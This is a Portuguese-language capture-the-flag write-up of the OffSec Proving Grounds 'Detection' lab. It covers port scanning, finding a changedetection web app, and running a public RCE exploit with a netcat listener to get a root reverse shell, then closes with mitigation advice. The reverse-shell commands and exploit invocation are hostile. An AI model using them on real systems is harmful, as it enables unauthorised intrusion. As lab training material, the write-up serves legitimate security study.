---
title:     "OffSec Proving Grounds - Detection"
tags: [Linux,easy,OffSec,changedetection,rce]
categories: OffSecProvingGrounds
---

![image](https://github.com/user-attachments/assets/4ee86e3a-f3fa-4b2d-9ce1-e70979c3706f)

## Enumeration

A primeira etapa no processo de exploração foi a enumeração da máquina alvo utilizando o **Nmap**. Realizei um scan completo de portas para identificar todos os serviços em execução no endereço IP **192.168.246.97**. 

O comando utilizado foi:

```
nmap -T4 -p- -v 192.168.246.97 -oN nmap-all-ports.log
```

Esse comando varreu todas as portas disponíveis (0-65535) e salvou os resultados no arquivo `nmap-all-ports.log` para análise posterior. A técnica **T4** foi usada para acelerar a varredura, sem comprometer a precisão.

![image](https://github.com/user-attachments/assets/58c52c09-854f-465f-b90d-6545fb16bc46)

### Uso do nmapAutomator

Em paralelo, utilizei o script [nmapAutomator.sh](https://github.com/21y4d/nmapAutomator), que facilita e agiliza o processo de enumeração. Esse script permite executar varreduras completas em segundo plano, otimizando nosso tempo ao automatizar várias etapas do processo de enumeração.

O comando utilizado foi:

```
nmapAutomator.sh -H 192.168.246.97 -t All -o nmapautomator.log
```

![image](https://github.com/user-attachments/assets/5238ba5a-536a-4fc6-a365-a4076c1d5082)

Esse comando executa uma varredura completa (**All**) no alvo especificado (**192.168.246.97**), e salva os resultados no arquivo `nmapautomator.log`. O **nmapAutomator.sh** é uma ferramenta eficaz para agilizar o processo de enumeração e permite que a varredura seja realizada em segundo plano enquanto outras atividades são conduzidas.

### Análise dos Resultados

Após a execução dos scans, tanto manualmente com o **Nmap** quanto com o **nmapAutomator.sh**, analisaremos os resultados para identificar portas abertas, serviços em execução, e quaisquer possíveis vulnerabilidades. A partir daqui, a próxima etapa envolverá a inspeção detalhada dos serviços detectados, procurando por potenciais vulnerabilidades que possam ser exploradas para obter acesso ao sistema.

### Identificação das Portas Abertas

Após a análise dos resultados das varreduras, foram identificadas duas portas abertas na máquina alvo:

- **Porta 22**: Comumente usada para **SSH**.
- **Porta 5000**: Uma porta menos comum, não usualmente associada a serviços SSH.

Dado que a porta **5000** não é uma porta padrão para SSH, decidimos investigá-la primeiro.

### Investigação da Porta 5000

Ao acessar a porta **5000** via navegador, digitando o endereço `http://192.168.246.97:5000`, encontramos uma aplicação em execução chamada **changedetection**. Essa ferramenta é usada para monitorar mudanças em páginas web, enviando alertas quando uma alteração é detectada.

![image](https://github.com/user-attachments/assets/7a3ec28b-551e-471c-a053-05ce6620540d)

A presença do **changedetection** na porta 5000 é interessante e pode oferecer uma superfície de ataque que merece ser explorada. A próxima etapa envolverá a análise da aplicação para identificar potenciais vulnerabilidades que possam ser exploradas para obter acesso ao sistema.

## Exploitation

### Exploração da Aplicação Changedetection

Com o nome da aplicação **changedetection** identificado, utilizamos o **SearchSploit**, uma ferramenta disponível no Kali Linux, para verificar se existe algum exploit conhecido disponível.

O comando utilizado foi:

```
searchsploit changedetection
```
![image](https://github.com/user-attachments/assets/948f77d9-fc64-49b3-9392-f69a847ba64a)

### Encontrando e Baixando um Exploit RCE

Durante a busca, encontramos um **Remote Code Execution (RCE)** exploit disponível para a aplicação changedetection. Decidimos baixar o exploit para nossa máquina utilizando o comando:

```
searchsploit -m multiple/webapps/52027.py
```

Este comando copia o exploit para o diretório atual, permitindo que ele seja modificado ou executado conforme necessário.

### Preparando o Ambiente para Execução do Exploit

Para executar o exploit, primeiro precisamos instalar a biblioteca **pwn** necessária para a execução correta do script. A instalação pode ser feita com o comando:

```
pip3 install pwn
```

### Configurando o Listener

Antes de executar o exploit, é importante configurar um listener em nossa máquina para capturar a conexão reversa. Como portas como **443** e **53** geralmente estão abertas em firewalls, são recomendadas para serem usadas como listeners. Outras portas, como **4444**, podem estar bloqueadas.

Para configurar o listener, utilizamos o comando **netcat**:

```
nc -nlvp 443
```

### Executando o Exploit

Com o listener ativo, estamos prontos para executar o exploit e obter acesso ao sistema. O comando para executar o exploit é:

```
python3 52027.py --url http://192.168.246.97:5000/ --port 443 --ip 192.168.45.213
```

- **--url**: O URL da aplicação changedetection na porta 5000.
- **--port**: A porta que configuramos para o listener (neste caso, 443).
- **--ip**: O endereço IP da nossa máquina atacante.

Se o exploit for bem-sucedido, ele irá conectar de volta ao nosso listener, proporcionando acesso ao sistema alvo através de uma shell remota.

![image](https://github.com/user-attachments/assets/dfb929be-1c93-44f6-b063-553c728540f2)

### Acesso à Máquina com Privilégios de Root

Com a execução bem-sucedida do exploit, conseguimos obter uma reverse shell na máquina alvo com privilégios de **root**. Isso nos proporciona controle total sobre o sistema, permitindo a exploração completa e a captura das flags necessárias.

#### Capturando as Flags

Com o acesso root, o próximo passo é procurar e capturar as flags. Em muitas máquinas, você encontrará dois arquivos de flag:

- **local.txt**: Geralmente encontrado no diretório do usuário ou em um local específico.
- **proof.txt**: Frequentemente localizado em um diretório de sistema ou na área de trabalho do usuário root.

Em algumas máquinas, apenas o **proof.txt** estará presente. Portanto, é essencial verificar ambos os locais para garantir que todas as flags sejam capturadas.

### Resumo do que Aconteceu

Neste writeup, abordamos a exploração de uma máquina Linux no **OffSec Proving Grounds** chamada **Detection**. Através de uma série de etapas bem planejadas, conseguimos mapear portas abertas, identificar a aplicação changedetection, e utilizar um exploit RCE disponível no **SearchSploit** para obter uma reverse shell com privilégios de root.

Os principais pontos abordados foram:

1. **Enumeração Detalhada**: Usando Nmap e nmapAutomator para identificar portas e serviços em execução.
2. **Busca por Exploits**: Utilizando SearchSploit para encontrar um exploit conhecido para a aplicação changedetection.
3. **Execução do Exploit**: Configuração do ambiente e execução de um exploit RCE para obter acesso root na máquina alvo.
4. **Captura de Flags**: Uma vez com acesso root, capturamos as flags locais e de proof.

### Mitigação: Como Proteger-se contra Explorações Semelhantes

Para evitar que vulnerabilidades semelhantes sejam exploradas, é importante seguir as melhores práticas de segurança. Aqui estão algumas medidas de mitigação que podem ser implementadas:

1. **Manter Softwares Atualizados**: Certifique-se de que todas as aplicações, especialmente aquelas expostas à internet, estejam atualizadas com os últimos patches de segurança. Vulnerabilidades conhecidas frequentemente são exploradas quando não corrigidas.

2. **Restringir o Acesso a Portas Sensíveis**: Limite o acesso a portas não padrão, como a porta 5000 usada pela aplicação changedetection, configurando firewalls para permitir o acesso apenas a partir de IPs confiáveis.

3. **Implementar Autenticação Forte**: Sempre use autenticação forte e, se possível, implemente autenticação multifatorial (MFA) para acessar aplicações críticas.

4. **Revisar Configurações de Segurança**: Realize auditorias regulares das configurações de segurança para identificar e corrigir configurações fracas ou inadequadas.

5. **Monitoramento Contínuo**: Utilize ferramentas de monitoramento e detecção de intrusões (IDS) para identificar atividades suspeitas ou incomuns no sistema.

6. **Segregação de Privilégios**: Limite os privilégios concedidos aos serviços e aplicações para minimizar o impacto de uma possível exploração. Serviços não devem rodar com privilégios de root, a menos que absolutamente necessário.

Implementando essas medidas, você pode reduzir significativamente o risco de exploração em seus sistemas, protegendo-se contra ataques semelhantes ao que foi demonstrado neste writeup.



